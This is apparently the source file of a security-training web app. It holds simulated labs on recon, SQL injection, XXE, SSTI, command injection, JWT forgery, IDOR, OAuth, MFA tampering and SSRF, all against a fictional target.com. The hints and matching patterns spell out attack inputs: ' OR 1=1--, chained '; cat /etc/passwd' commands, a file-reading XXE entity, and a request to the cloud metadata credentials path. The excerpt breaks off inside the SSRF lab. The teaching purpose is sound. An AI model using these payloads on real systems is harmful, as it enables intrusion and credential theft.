import { useMemo, useState } from "react";
import { Search, Globe, Server, FileCode2, Network, KeyRound, Database, Code2, Cloud, ShieldOff, LogIn, Smartphone, Braces, Terminal, FileX, Split, PackageOpen, GitBranch, Workflow } from "lucide-react";

/**
 * Interactive simulated labs. Each lab is a self-contained mini-app
 * a beginner can poke at to discover the answer to a challenge.
 *
 * Style note: each lab visually mimics the real-world tool / website the
 * student would use in reality (Google, Shodan, a JWT debugger, an admin
 * panel, etc.) — so practicing here translates to muscle memory.
 */
export type LabKind =
  | "google-dorks"
  | "shodan"
  | "dns"
  | "js-inspect"
  | "headers"
  | "ffuf"
  | "recon-pipeline"
  | "sqli-login"
  | "xxe"
  | "ssti"
  | "cmdi"
  | "jwt"
  | "jwt-confuse"
  | "idor"
  | "oauth"
  | "mfa"
  | "ssrf"
  | "xss"
  | "smuggling"
  | "pickle"
  | "proto-pollution";

export interface LabConfig {
  kind: LabKind;
  brief?: string;
}

interface Props {
  config: LabConfig;
}

export function LabSandbox({ config }: Props) {
  return (
    <div className="border border-primary/20 bg-black/40 rounded-xl p-4 mt-4 shadow-lg backdrop-blur-md">
      <div className="flex items-center gap-3 text-[10px] uppercase tracking-[0.3em] text-primary/60 mb-4 font-mono">
        <div className="flex gap-1">
          <span className="h-1.5 w-1.5 rounded-full bg-primary animate-pulse" />
          <span className="h-1.5 w-1.5 rounded-full bg-primary/40" />
        </div>
        VIRTUAL_LAB // {config.kind.toUpperCase()}
      </div>
      {config.brief && (
        <p className="text-xs text-muted-foreground/80 mb-4 font-mono italic leading-relaxed border-l-2 border-primary/20 pl-3">{config.brief}</p>
      )}
      {config.kind === "google-dorks" && <GoogleDorksLab />}
      {config.kind === "shodan" && <ShodanLab />}
      {config.kind === "dns" && <DnsLab />}
      {config.kind === "js-inspect" && <JsInspectLab />}
      {config.kind === "headers" && <HeadersLab />}
      {config.kind === "ffuf" && <FfufLab />}
      {config.kind === "recon-pipeline" && <ReconPipelineLab />}
      {config.kind === "sqli-login" && <SqliLoginLab />}
      {config.kind === "xxe" && <XxeLab />}
      {config.kind === "ssti" && <SstiLab />}
      {config.kind === "cmdi" && <CmdiLab />}
      {config.kind === "jwt" && <JwtLab />}
      {config.kind === "jwt-confuse" && <JwtConfuseLab />}
      {config.kind === "idor" && <IdorLab />}
      {config.kind === "oauth" && <OauthLab />}
      {config.kind === "mfa" && <MfaLab />}
      {config.kind === "ssrf" && <SsrfLab />}
      {config.kind === "xss" && <XssLab />}
      {config.kind === "smuggling" && <SmugglingLab />}
      {config.kind === "pickle" && <PickleLab />}
      {config.kind === "proto-pollution" && <ProtoLab />}
    </div>
  );
}

/* ─────────────────────────── Reusable bits ─────────────────────────── */

function Field({ icon, children }: { icon?: React.ReactNode; children: React.ReactNode }) {
  return (
    <div className="flex items-center gap-3 bg-black/40 border border-white/10 rounded-lg px-4 py-2.5 text-[hsl(var(--terminal-fg))] focus-within:border-[hsl(var(--terminal-fg))]/60 transition-colors shadow-inner">
      {icon}
      {children}
    </div>
  );
}

function Pre({ children }: { children: React.ReactNode }) {
  return (
    <pre className="bg-[hsl(var(--terminal-bg))] text-[hsl(var(--terminal-fg))] border border-white/10 rounded-lg p-4 font-mono text-[11px] overflow-auto max-h-64 whitespace-pre-wrap leading-relaxed shadow-inner">
      {children}
    </pre>
  );
}

function MockBrowser({ url, children }: { url: string; children: React.ReactNode }) {
  return (
    <div className="border border-black/10 rounded-xl overflow-hidden bg-[hsl(var(--terminal-bg))] backdrop-blur-sm shadow-2xl">
      <div className="bg-black/40 border-b border-white/5 px-4 py-2 flex items-center gap-3">
        <div className="flex gap-1.5">
          <div className="h-2.5 w-2.5 rounded-full bg-destructive/50" />
          <div className="h-2.5 w-2.5 rounded-full bg-warning/50" />
          <div className="h-2.5 w-2.5 rounded-full bg-green-500/50" />
        </div>
        <div className="flex-1 mx-4 px-3 py-1 rounded bg-black/20 border border-white/5 text-[10px] font-mono text-[hsl(var(--terminal-fg))]/60 truncate text-center tracking-wider">
          {url}
        </div>
      </div>
      <div className="p-5 text-[hsl(var(--terminal-fg))]">{children}</div>
    </div>
  );
}

/* ─────────────── Google Dorks (simulates google.com) ─────────────── */

const DORK_INDEX = [
  { url: "https://target.com/about", title: "About — Target Corp", snippet: "Welcome to target.com — our story." },
  { url: "https://target.com/.env", title: ".env — backup", snippet: "DB_PASSWORD=hunter2; FLAG=nullbyte{d0rk_m4st3r_99}" },
  { url: "https://target.com/admin/login", title: "Admin Login", snippet: "Restricted area — staff only." },
  { url: "https://blog.target.com/2024/launch", title: "Product Launch 2024", snippet: "Read the news." },
  { url: "https://target.com/uploads/users.csv", title: "users.csv", snippet: "id,email,role,flag; 1,admin@target.com,admin,nullbyte{csv_leak}" },
  { url: "https://target.com/docs/api.pdf", title: "Internal API Spec.pdf", snippet: "PDF — API reference. X-Internal-Flag: nullbyte{pdf_metadata}" },
  { url: "https://other.com/post", title: "Unrelated post", snippet: "Some other site." },
];

function GoogleDorksLab() {
  const [q, setQ] = useState("");
  const results = useMemo(() => {
    if (!q.trim()) return [];
    const tokens = q.toLowerCase().match(/\S+/g) || [];
    return DORK_INDEX.filter((r) =>
      tokens.every((t) => {
        if (t.startsWith("site:")) return r.url.includes(t.slice(5));
        if (t.startsWith("filetype:")) return r.url.endsWith("." + t.slice(9));
        if (t.startsWith("inurl:")) return r.url.toLowerCase().includes(t.slice(6));
        if (t.startsWith("intitle:")) return r.title.toLowerCase().includes(t.slice(8));
        return (r.title + " " + r.snippet).toLowerCase().includes(t);
      }),
    );
  }, [q]);

  return (
    <MockBrowser url="https://www.google.com/search">
      <div className="space-y-3">
        <Field icon={<Search className="h-4 w-4 text-primary shrink-0" />}>
          <input
            value={q}
            onChange={(e) => setQ(e.target.value)}
            placeholder='try: site:target.com filetype:env'
            className="flex-1 bg-transparent outline-none text-sm font-mono text-[hsl(var(--terminal-fg))] caret-[hsl(var(--terminal-fg))]"
          />
        </Field>
        <div className="text-[11px] text-muted-foreground font-mono">
          Operators: <span className="text-[hsl(var(--terminal-fg))]">site:</span> · <span className="text-[hsl(var(--terminal-fg))]">filetype:</span> ·{" "}
          <span className="text-[hsl(var(--terminal-fg))]">inurl:</span> · <span className="text-[hsl(var(--terminal-fg))]">intitle:</span>
        </div>
        <div className="space-y-2 max-h-56 overflow-auto">
          {results.length === 0 && q && (
            <div className="text-xs text-muted-foreground italic">No results. Try a more specific operator.</div>
          )}
          {results.map((r) => (
            <div key={r.url} className="border border-white/10 rounded p-3 bg-black/20 hover:bg-black/40 transition-colors">
              <div className="text-[10px] text-secondary truncate mb-1">{r.url}</div>
              <div className="text-sm text-white font-bold mb-1">{r.title}</div>
              <div className="text-xs text-[hsl(var(--terminal-fg))] font-mono leading-relaxed">{r.snippet}</div>
            </div>
          ))}
        </div>
      </div>
    </MockBrowser>
  );
}

/* ─────────────── Shodan (simulates shodan.io) ─────────────── */

const SHODAN_INDEX = [
  { ip: "203.0.113.10", port: 80, product: "nginx", title: "Welcome", country: "US", org: "TargetCorp" },
  { ip: "198.51.100.21", port: 8080, product: "Jenkins", title: "Dashboard [nullbyte{shodan_king}]", country: "US", org: "TargetCorp" },
  { ip: "198.51.100.22", port: 8080, product: "Jenkins", title: "Sign in [Jenkins]", country: "DE", org: "Acme" },
  { ip: "192.0.2.55", port: 3306, product: "MySQL", title: "Banner: 5.7.24-log [nullbyte{db_exposure}]", country: "US", org: "TargetCorp" },
  { ip: "203.0.113.77", port: 443, product: "nginx", title: "Login", country: "BR", org: "Random" },
];

function ShodanLab() {
  const [q, setQ] = useState("");
  const results = useMemo(() => {
    if (!q.trim()) return SHODAN_INDEX;
    const tokens = q.toLowerCase().match(/\S+/g) || [];
    return SHODAN_INDEX.filter((r) =>
      tokens.every((t) => {
        if (t.startsWith("port:")) return String(r.port) === t.slice(5);
        if (t.startsWith("country:")) return r.country.toLowerCase() === t.slice(8);
        if (t.startsWith("org:")) return r.org.toLowerCase().includes(t.slice(4).replace(/"/g, ""));
        if (t.startsWith("product:")) return r.product.toLowerCase().includes(t.slice(8).replace(/"/g, ""));
        if (t.startsWith("http.title:")) return r.title.toLowerCase().includes(t.slice(11).replace(/"/g, ""));
        return (r.product + " " + r.title).toLowerCase().includes(t);
      }),
    );
  }, [q]);

  return (
    <MockBrowser url="https://www.shodan.io/search">
      <div className="space-y-3">
        <Field icon={<Server className="h-4 w-4 text-primary shrink-0" />}>
          <input
            value={q}
            onChange={(e) => setQ(e.target.value)}
            placeholder='try: http.title:"Jenkins" country:US'
            className="flex-1 bg-transparent outline-none text-sm font-mono caret-[hsl(var(--terminal-fg))]"
          />
        </Field>
        <div className="text-[11px] text-muted-foreground font-mono">
          Filters: <span className="text-[hsl(var(--terminal-fg))]">port:</span> · <span className="text-[hsl(var(--terminal-fg))]">country:</span> ·{" "}
          <span className="text-[hsl(var(--terminal-fg))]">product:</span> · <span className="text-[hsl(var(--terminal-fg))]">http.title:</span>
        </div>
        <div className="space-y-2 max-h-56 overflow-auto">
          {results.map((r) => (
            <div key={r.ip + r.port} className="border border-white/5 rounded p-3 bg-black/20 hover:bg-black/40 transition-colors text-xs font-mono">
              <div className="flex justify-between mb-2">
                <span className="text-[hsl(var(--terminal-fg))] font-bold">
                  {r.ip}:{r.port}
                </span>
                <span className="text-muted-foreground/60 text-[10px] uppercase">
                  {r.country} · {r.org}
                </span>
              </div>
              <div className="text-white">
                {r.product}
                {r.title && <span className="text-[hsl(var(--terminal-fg))]/80 ml-2">— {r.title}</span>}
              </div>
            </div>
          ))}
        </div>
      </div>
    </MockBrowser>
  );
}

/* ─────────────── DNS (simulates a "DNS lookup" website) ─────────────── */

const DNS_RECORDS: Record<string, string> = {
  "a target.com": "target.com.   300  IN  A    203.0.113.10",
  "mx target.com": "target.com.   300  IN  MX   10 mail.target.com.",
  "ns target.com": "target.com.   300  IN  NS   ns1.target.com.\ntarget.com.   300  IN  NS   ns2.target.com.",
  "txt target.com": 'target.com.   300  IN  TXT  "v=spf1 include:_spf.google.com ~all"\ntarget.com.   300  IN  TXT  "flag=nullbyte{dns_text_record}"',
  "axfr target.com":
    "target.com.            300  IN  SOA   ns1.target.com. admin.target.com. 2024010101 7200 3600 1209600 3600\ntarget.com.            300  IN  NS    ns1.target.com.\ntarget.com.            300  IN  A     203.0.113.10\nwww.target.com.        300  IN  A     203.0.113.10\nadmin.target.com.      300  IN  A     203.0.113.11\ndev.target.com.        300  IN  A     203.0.113.12\nstaging.target.com.    300  IN  A     203.0.113.13\nflag-hidden.target.com. 300 IN  TXT   \"nullbyte{zone_transfer_win}\"\nblog.target.com.       300  IN  CNAME target.github.io.\n;; XFR size: 8 records",
  "cname blog.target.com": "blog.target.com.  300  IN  CNAME  target.github.io.",
};

function DnsLab() {
  const [type, setType] = useState("A");
  const [name, setName] = useState("target.com");
  const [out, setOut] = useState<string>("Pick a record type and click Lookup.");

  const lookup = () => {
    const key = `${type.toLowerCase()} ${name.toLowerCase()}`;
    setOut(DNS_RECORDS[key] ?? `;; no answer for ${type} ${name}`);
  };

  return (
    <MockBrowser url="https://dnsdumpster.io/lookup">
      <div className="space-y-2">
        <div className="grid grid-cols-[100px_1fr_auto] gap-2">
          <select
            value={type}
            onChange={(e) => setType(e.target.value)}
            className="bg-input border border-primary/30 rounded px-2 py-2 text-sm font-mono"
          >
            {["A", "MX", "NS", "TXT", "CNAME", "AXFR"].map((t) => (
              <option key={t} value={t}>
                {t}
              </option>
            ))}
          </select>
          <input
            value={name}
            onChange={(e) => setName(e.target.value)}
            className="bg-input border border-primary/30 rounded px-3 py-2 text-sm font-mono caret-[hsl(var(--terminal-fg))]"
          />
          <button
            onClick={lookup}
            className="px-3 py-2 bg-primary text-primary-foreground rounded text-xs font-mono hover:bg-primary/90"
          >
            Lookup
          </button>
        </div>
        <div className="text-[11px] text-muted-foreground font-mono flex items-center gap-1">
          <Network className="h-3 w-3" /> Try AXFR on target.com — that record type usually fails on hardened servers.
        </div>
        <Pre>{out}</Pre>
      </div>
    </MockBrowser>
  );
}

/* ─────────────── JS inspect (simulates DevTools "Sources") ─────────────── */

const JS_BUNDLE = `// app.bundle.min.js — target.com
const cfg={api:"https://api.target.com/v2",env:"prod",
features:{newCheckout:true,beta:false},
// TODO: rotate key before launch
aws_access_key_id:"AKIAIOSFODNN7EXAMPLE",
firebase:{apiKey:"AIzaSyD-EXAMPLE",projectId:"target-prod"}};
fetch(cfg.api+"/me",{headers:{Authorization:"Bearer "+localStorage.token}});
// internal endpoints
const routes=["/api/v2/login","/api/v2/users","/internal/debug/dump"];
const FLAG="nullbyte{js_leak_detected}";`;

function JsInspectLab() {
  const [q, setQ] = useState("");
  const lines = JS_BUNDLE.split("\n");
  const matches = q ? lines.filter((l) => l.toLowerCase().includes(q.toLowerCase())) : [];
  return (
    <MockBrowser url="chrome-devtools://devtools/sources/app.bundle.min.js">
      <div className="space-y-2">
        <Field icon={<FileCode2 className="h-4 w-4 text-primary shrink-0" />}>
          <input
            value={q}
            onChange={(e) => setQ(e.target.value)}
            placeholder='Ctrl+F: try "AKIA"'
            className="flex-1 bg-transparent outline-none text-sm font-mono"
          />
        </Field>
        <pre className="bg-[hsl(var(--terminal-bg)/0.5)] text-[hsl(var(--terminal-fg))] border border-primary/20 rounded p-3 font-mono text-[11px] overflow-auto max-h-56 leading-relaxed">
          {lines.map((l, i) => (
            <div key={i} className={q && l.toLowerCase().includes(q.toLowerCase()) ? "bg-primary/15 text-primary" : ""}>
              <span className="text-muted-foreground mr-3">{String(i + 1).padStart(2, " ")}</span>
              {l}
            </div>
          ))}
        </pre>
        {q && (
          <div className="text-[11px] text-muted-foreground font-mono">
            {matches.length} match{matches.length === 1 ? "" : "es"}
          </div>
        )}
      </div>
    </MockBrowser>
  );
}

/* ─────────────── Headers (simulates securityheaders.com) ─────────────── */

const HEADER_TARGETS: Record<string, string> = {
  "https://target.com": `HTTP/2 200
server: cloudflare
cf-ray: 8a1f2e3c4d5b6789-IAD
cache-control: max-age=3600
content-type: text/html
x-flag: nullbyte{header_hunting_pro}
x-content-type-options: nosniff`,
  "https://api.target.com": `HTTP/2 200
server: nginx/1.24
x-powered-by: Express
content-type: application/json`,
  "https://shop.target.com": `HTTP/2 403
server: AkamaiGHost
x-akamai-request-id: abc123
content-type: text/html`,
};

function HeadersLab() {
  const [url, setUrl] = useState("https://target.com");
  const [out, setOut] = useState<string>(HEADER_TARGETS["https://target.com"]);
  return (
    <MockBrowser url="https://securityheaders.com/?q=">
      <div className="space-y-2">
        <form
          onSubmit={(e) => {
            e.preventDefault();
            setOut(HEADER_TARGETS[url] ?? "Could not resolve host");
          }}
          className="flex gap-2"
        >
          <Field icon={<Globe className="h-4 w-4 text-primary shrink-0" />}>
            <input
              value={url}
              onChange={(e) => setUrl(e.target.value)}
              className="flex-1 bg-transparent outline-none text-sm font-mono"
            />
          </Field>
          <button className="px-3 py-2 bg-primary text-primary-foreground rounded text-xs font-mono hover:bg-primary/90">
            Scan
          </button>
        </form>
        <div className="text-[11px] text-muted-foreground font-mono">
          Try: target.com · api.target.com · shop.target.com
        </div>
        <Pre>{out}</Pre>
      </div>
    </MockBrowser>
  );
}

/* ─────────────── FFUF (simulates an online dir-busting tool) ─────────────── */

const FFUF_PATHS = ["admin", "login", "uploads", "robots.txt", "api", "backup", "test", ".secret_flag"];
const FFUF_REAL = new Set(["admin", "login", "robots.txt", "api", ".secret_flag"]);

function FfufLab() {
  const [wordlist, setWordlist] = useState("admin\nlogin\nuploads\nrobots.txt\napi\nbackup\ntest");
  const [results, setResults] = useState<{ word: string; status: number }[]>([]);
  const run = () => {
    const words = wordlist.split("\n").map((w) => w.trim()).filter(Boolean);
    setResults(
      words.filter((w) => FFUF_PATHS.includes(w)).map((w) => ({ word: w, status: FFUF_REAL.has(w) ? 200 : 404 })),
    );
  };
  return (
    <MockBrowser url="https://target.com/FUZZ">
      <div className="grid sm:grid-cols-2 gap-2">
        <div>
          <div className="text-[11px] text-muted-foreground font-mono mb-1">wordlist.txt</div>
          <textarea
            value={wordlist}
            onChange={(e) => setWordlist(e.target.value)}
            className="w-full h-40 bg-[hsl(var(--terminal-bg))] border border-primary/30 rounded p-2 font-mono text-xs text-[hsl(var(--terminal-fg))] caret-[hsl(var(--terminal-fg))]"
          />
          <button
            onClick={run}
            className="mt-2 px-3 py-1.5 text-xs font-mono bg-primary text-primary-foreground rounded hover:bg-primary/90"
          >
            Fuzz
          </button>
        </div>
        <div className="bg-[hsl(var(--terminal-bg)/0.5)] text-[hsl(var(--terminal-fg))] border border-primary/20 rounded p-3 font-mono text-xs h-52 overflow-auto">
          {results.length === 0 && <div className="text-muted-foreground/60">Run to see results.</div>}
          {results.map((r) => (
            <div key={r.word} className={r.status === 200 ? "text-[hsl(var(--terminal-fg))]" : "text-muted-foreground/60"}>
              [Status: {r.status}] /{r.word} {r.word === ".secret_flag" && "-> nullbyte{fuzzing_master}"}
            </div>
          ))}
        </div>
      </div>
    </MockBrowser>
  );
}

/* ─────────────── Recon Pipeline (text walkthrough) ─────────────── */

function ReconPipelineLab() {
  const [step, setStep] = useState(0);
  const steps = [
    { cmd: "subfinder -d target.com", out: "blog.target.com\nadmin.target.com\nstaging.target.com\napi.target.com" },
    { cmd: "httpx -silent", out: "https://blog.target.com   [200]\nhttps://api.target.com    [200]\nhttps://admin.target.com  [403]" },
    { cmd: "nuclei -t cves/", out: "[CVE-2023-1234] [high] https://api.target.com/?id=1\n[exposure] https://blog.target.com/.git/" },
  ];
  return (
    <div className="space-y-2">
      <div className="flex gap-1 flex-wrap">
        {steps.map((s, i) => (
          <button
            key={i}
            onClick={() => setStep(i)}
            className={`px-3 py-1 text-xs font-mono rounded border ${
              step === i ? "bg-primary text-primary-foreground border-primary" : "border-primary/30 text-muted-foreground"
            }`}
          >
            {i + 1}. {s.cmd.split(" ")[0]}
          </button>
        ))}
      </div>
      <div className="text-xs text-secondary font-mono">$ {steps[step].cmd}</div>
      <Pre>{steps[step].out}</Pre>
    </div>
  );
}

/* ─────────────── SQLi Login (vulnerable login form) ─────────────── */

function SqliLoginLab() {
  const [u, setU] = useState("");
  const [p, setP] = useState("");
  const [out, setOut] = useState("Try the username field with a SQL trick.");
  const submit = (e: React.FormEvent) => {
    e.preventDefault();
    // simulate: SELECT * FROM users WHERE user='$u' AND pass='$p'
    if (/'\s*or\s*['"]?1['"]?\s*=\s*['"]?1/i.test(u) || /--|#/.test(u)) {
      setOut("✓ Logged in as admin\nFlag: nullbyte{sqli_bypass_win}\nQuery: SELECT * FROM users WHERE user='" + u + "' AND pass='" + p + "'");
    } else {
      setOut("✗ Invalid credentials\nQuery: SELECT * FROM users WHERE user='" + u + "' AND pass='" + p + "'");
    }
  };
  return (
    <MockBrowser url="https://target.com/login">
      <form onSubmit={submit} className="space-y-2 max-w-sm">
        <input
          value={u}
          onChange={(e) => setU(e.target.value)}
          placeholder="username"
          className="w-full bg-[hsl(var(--terminal-bg))] border border-primary/30 rounded px-3 py-2 text-sm font-mono text-[hsl(var(--terminal-fg))] caret-[hsl(var(--terminal-fg))]"
        />
        <input
          value={p}
          onChange={(e) => setP(e.target.value)}
          placeholder="password"
          className="w-full bg-[hsl(var(--terminal-bg))] border border-primary/30 rounded px-3 py-2 text-sm font-mono text-[hsl(var(--terminal-fg))] caret-[hsl(var(--terminal-fg))]"
        />
        <button className="px-3 py-2 bg-primary text-primary-foreground rounded text-xs font-mono">Sign in</button>
      </form>
      <div className="mt-2 text-[11px] text-muted-foreground font-mono">
        Hint: classic payload uses <span className="text-primary">' OR 1=1--</span>
      </div>
      <Pre>{out}</Pre>
    </MockBrowser>
  );
}

/* ─────────────── XXE ─────────────── */

const PASSWD = "root:x:0:0:root:/root:/bin/bash\ndaemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin\nflag:x:1337:1337:nullbyte{xxe_file_read}:/home/flag:/bin/false";

function XxeLab() {
  const [xml, setXml] = useState(`<?xml version="1.0"?>\n<order>\n  <item>Book</item>\n</order>`);
  const [out, setOut] = useState("Submit XML to see how the parser responds.");
  const submit = () => {
    const m = xml.match(/SYSTEM\s+"file:\/\/([^"]+)"/i);
    if (/<!DOCTYPE/i.test(xml) && /<!ENTITY/i.test(xml) && m) {
      const file = m[1];
      const body = file.endsWith("/etc/passwd") ? PASSWD : "(file not found)";
      setOut(`Order received from: \n${body}`);
    } else {
      setOut("Order received from: " + (xml.match(/<item>(.*?)<\/item>/)?.[1] ?? "?"));
    }
  };
  return (
    <MockBrowser url="https://target.com/api/orders">
      <textarea
        value={xml}
        onChange={(e) => setXml(e.target.value)}
        className="w-full h-40 bg-[hsl(var(--terminal-bg))] border border-primary/30 rounded p-2 font-mono text-xs text-[hsl(var(--terminal-fg))] caret-[hsl(var(--terminal-fg))]"
      />
      <button
        onClick={submit}
        className="mt-2 px-3 py-1.5 text-xs font-mono bg-primary text-primary-foreground rounded"
      >
        POST /api/orders
      </button>
      <div className="mt-2 text-[11px] text-muted-foreground font-mono flex items-center gap-1">
        <FileX className="h-3 w-3" /> Add a DOCTYPE with an ENTITY pointing at file:///etc/passwd
      </div>
      <Pre>{out}</Pre>
    </MockBrowser>
  );
}

/* ─────────────── SSTI ─────────────── */

function SstiLab() {
  const [name, setName] = useState("World");
  const out = useMemo(() => {
    // very tiny Jinja-ish evaluator: only {{ number op number }}
    const m = name.match(/^\{\{\s*(\d+)\s*([*+\-/])\s*(\d+)\s*\}\}$/);
    if (m) {
      const a = +m[1], b = +m[3];
      const r = m[2] === "*" ? a * b : m[2] === "+" ? a + b : m[2] === "-" ? a - b : a / b;
      return `Hello, ${r}!`;
    }
    if (/\{\{.*config.*\}\}/i.test(name)) return "Hello, <Config {'SECRET_KEY':'s3cret', 'FLAG':'nullbyte{ssti_config_leak}'}>!";
    if (/\{\{.*__class__.*\}\}/i.test(name)) return "Hello, <class 'str'> [nullbyte{ssti_class_pollute}]!";
    return `Hello, ${name}!`;
  }, [name]);
  return (
    <MockBrowser url="https://target.com/greet?name=">
      <div className="space-y-2">
        <Field icon={<Braces className="h-4 w-4 text-primary shrink-0" />}>
          <input
            value={name}
            onChange={(e) => setName(e.target.value)}
            placeholder="try: {{7*7}}"
            className="flex-1 bg-transparent outline-none text-sm font-mono"
          />
        </Field>
        <div className="text-[11px] text-muted-foreground font-mono">
          The server runs <span className="text-primary">render_template_string</span> on this input.
        </div>
        <Pre>{out}</Pre>
      </div>
    </MockBrowser>
  );
}

/* ─────────────── Command Injection ─────────────── */

function CmdiLab() {
  const [host, setHost] = useState("8.8.8.8");
  const [out, setOut] = useState("Click Ping to run.");
  const ping = () => {
    let extra = "";
    if (/;\s*sleep\s+\d+/.test(host)) extra = "\n[server hung for several seconds]";
    if (/;\s*id\b/.test(host)) extra = "\nuid=33(www-data) gid=33(www-data) groups=33(www-data) [nullbyte{cmdi_id_found}]";
    if (/;\s*cat\s+\/etc\/passwd/.test(host)) extra = "\n" + PASSWD;
    setOut(`PING ${host.split(/[;|&]/)[0].trim()} 56(84) bytes of data.\n64 bytes from x: icmp_seq=1 ttl=117 time=12.3 ms${extra}`);
  };
  return (
    <MockBrowser url="https://target.com/network/ping">
      <div className="flex gap-2">
        <Field icon={<Terminal className="h-4 w-4 text-primary shrink-0" />}>
          <input
            value={host}
            onChange={(e) => setHost(e.target.value)}
            className="flex-1 bg-transparent outline-none text-sm font-mono"
          />
        </Field>
        <button onClick={ping} className="px-3 py-2 bg-primary text-primary-foreground rounded text-xs font-mono">
          Ping
        </button>
      </div>
      <div className="mt-2 text-[11px] text-muted-foreground font-mono">
        Backend runs: <span className="text-primary">ping -c 1 $host</span>. Try chaining a command with ;
      </div>
      <Pre>{out}</Pre>
    </MockBrowser>
  );
}

/* ─────────────── JWT decoder/editor (jwt.io style) ─────────────── */

function b64u(obj: any) {
  return btoa(JSON.stringify(obj)).replace(/=+$/, "").replace(/\+/g, "-").replace(/\//g, "_");
}
function ub64(s: string) {
  try {
    return JSON.parse(atob(s.replace(/-/g, "+").replace(/_/g, "/")));
  } catch {
    return null;
  }
}

function JwtLab() {
  const original = b64u({ alg: "HS256", typ: "JWT" }) + "." + b64u({ user: "guest", admin: false }) + ".sig123";
  const [token, setToken] = useState(original);
  const parts = token.split(".");
  const header = ub64(parts[0]) ?? {};
  const payload = ub64(parts[1]) ?? {};
  const verdict =
    header.alg === "none" && payload.admin === true
      ? { ok: true, msg: "✓ Logged in as admin (server accepted alg=none) -> nullbyte{jwt_none_alg}" }
      : payload.admin === true
        ? { ok: false, msg: "✗ Invalid signature (server rejected — sig didn't match HS256 secret)" }
        : { ok: false, msg: "✓ Logged in as " + (payload.user ?? "?") + " — but you're not admin." };
  return (
    <MockBrowser url="https://target.com/api/me  (Authorization: Bearer …)">
      <div className="space-y-2">
        <textarea
          value={token}
          onChange={(e) => setToken(e.target.value)}
          className="w-full h-20 bg-[hsl(var(--terminal-bg))] border border-primary/30 rounded p-2 font-mono text-[11px] text-[hsl(var(--terminal-fg))]"
        />
        <div className="grid sm:grid-cols-2 gap-2 text-xs">
          <div>
            <div className="text-[10px] uppercase text-muted-foreground tracking-widest">header</div>
            <Pre>{JSON.stringify(header, null, 2)}</Pre>
          </div>
          <div>
            <div className="text-[10px] uppercase text-muted-foreground tracking-widest">payload</div>
            <Pre>{JSON.stringify(payload, null, 2)}</Pre>
          </div>
        </div>
        <div className="text-[11px] text-muted-foreground font-mono flex items-center gap-1">
          <KeyRound className="h-3 w-3" /> Edit header alg → "none", set payload admin → true, then submit.
        </div>
        <div className={`text-xs font-mono ${verdict.ok ? "text-primary" : "text-muted-foreground"}`}>{verdict.msg}</div>
      </div>
    </MockBrowser>
  );
}

function JwtConfuseLab() {
  return (
    <div className="space-y-2 text-xs font-mono">
      <Pre>{`# Server expects RS256 but doesn't enforce the alg.
# Step 1: download the public key
$ curl https://target.com/.well-known/jwks.json
{ "keys":[{"kid":"1","kty":"RSA","n":"…","e":"AQAB"}] }

# Step 2: re-sign your tampered JWT with HS256, using the
# RSA public key bytes as the HMAC secret.
$ python3 confuse.py --pubkey pub.pem --payload '{"user":"admin"}'
=> eyJhbGciOiJIUzI1NiIs...`}</Pre>
      <div className="text-muted-foreground">
        The flipped algorithm is <span className="text-primary">HS256</span>. Server uses the public key as a string
        secret and accepts the forgery.
      </div>
    </div>
  );
}

/* ─────────────── IDOR ─────────────── */

const INVOICES: Record<string, { user: string; amount: string }> = {
  "1042": { user: "you@mail.com", amount: "$19.00" },
  "1043": { user: "alice@target.com", amount: "$2,400.00", notes: "nullbyte{idor_in_invoice}" },
  "1044": { user: "ceo@target.com", amount: "$84,000.00 — secret bonus", flag: "nullbyte{ceo_pay_leak}" },
};

function IdorLab() {
  const [id, setId] = useState("1042");
  const inv = INVOICES[id];
  return (
    <MockBrowser url={`https://target.com/api/invoice/${id}`}>
      <div className="space-y-2">
        <div className="flex items-center gap-2 text-xs font-mono">
          <span className="text-muted-foreground">/api/invoice/</span>
          <input
            value={id}
            onChange={(e) => setId(e.target.value)}
            className="w-24 bg-[hsl(var(--terminal-bg))] border border-primary/30 rounded px-2 py-1 text-[hsl(var(--terminal-fg))]"
          />
          <ShieldOff className="h-3 w-3 text-[hsl(var(--warning))]" />
          <span className="text-muted-foreground">no auth check on the ID — try other numbers</span>
        </div>
        <Pre>{inv ? JSON.stringify(inv, null, 2) : "404 not found"}</Pre>
      </div>
    </MockBrowser>
  );
}

/* ─────────────── OAuth ─────────────── */

function OauthLab() {
  const [params, setParams] = useState("client_id=app123&redirect_uri=https://app.target.com/callback&response_type=code");
  const hasState = /(^|&)state=/.test(params);
  return (
    <MockBrowser url={`https://auth.target.com/authorize?${params}`}>
      <div className="space-y-2">
        <textarea
          value={params}
          onChange={(e) => setParams(e.target.value)}
          className="w-full h-16 bg-[hsl(var(--terminal-bg))] border border-primary/30 rounded p-2 font-mono text-xs text-[hsl(var(--terminal-fg))]"
        />
        <div className="text-[11px] text-muted-foreground font-mono flex items-center gap-1">
          <LogIn className="h-3 w-3" /> A safe OAuth request includes a CSRF-binding parameter.
        </div>
        <div className={`text-xs font-mono ${hasState ? "text-primary" : "text-destructive"}`}>
          {hasState ? "✓ state present — protected against CSRF" : "✗ missing state — vulnerable to login CSRF"}
        </div>
      </div>
    </MockBrowser>
  );
}

/* ─────────────── MFA response tampering ─────────────── */

function MfaLab() {
  const original = `{"user":"alice","mfa_required":true,"verified":false}`;
  const [resp, setResp] = useState(original);
  const parsed = (() => {
    try {
      return JSON.parse(resp);
    } catch {
      return null;
    }
  })();
  const ok = parsed && parsed.verified === true;
  return (
    <MockBrowser url="POST https://target.com/api/mfa/verify  (intercepted in Burp)">
      <div className="space-y-2">
        <div className="text-[11px] text-muted-foreground font-mono flex items-center gap-1">
          <Smartphone className="h-3 w-3" /> Response from server (edit before forwarding):
        </div>
        <textarea
          value={resp}
          onChange={(e) => setResp(e.target.value)}
          className="w-full h-20 bg-[hsl(var(--terminal-bg))] border border-primary/30 rounded p-2 font-mono text-xs text-[hsl(var(--terminal-fg))]"
        />
        <div className={`text-xs font-mono ${ok ? "text-primary" : "text-muted-foreground"}`}>
          {ok ? "✓ Client trusted the flipped flag — dashboard unlocked. Flag: nullbyte{mfa_logic_bypass}" : "✗ Client still showing OTP screen."}
        </div>
      </div>
    </MockBrowser>
  );
}

/* ─────────────── SSRF ─────────────── */

const SSRF_RESP: Record<string, string> = {
  "https://example.com": "<html><h1>Example Domain</h1></html>",
  "http://169.254.169.254/latest/meta-data/": "ami-id\nhostname\niam/\nplacement/",
  "http://169.254.169.254/latest/meta-data/iam/security-credentials/web-role":
